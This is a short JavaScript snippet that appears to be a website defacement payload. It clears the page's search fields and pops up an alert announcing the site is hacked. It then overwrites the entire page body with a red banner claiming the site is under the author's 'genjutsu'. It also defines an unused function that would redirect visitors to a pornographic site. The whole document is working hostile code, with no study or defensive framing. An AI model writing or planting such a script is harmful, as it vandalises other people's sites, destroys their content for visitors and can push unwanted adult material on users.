document.getElementById("searchfield").value="";
document.getElementById("keySearch").value="";
function apagaBody() {
  var body = document.querySelector('body');
  body.innerHTML = '<h1 style="color: red">Esse site esta sobre meu genjutsu</h1>';
}
function message() {
	alert("Site hackeado!!!!")
}
function redirect() {
	window.location="https://www.xvideos.com/";
}
setTimeout(message, 8000)
setTimeout(apagaBody, 15000);

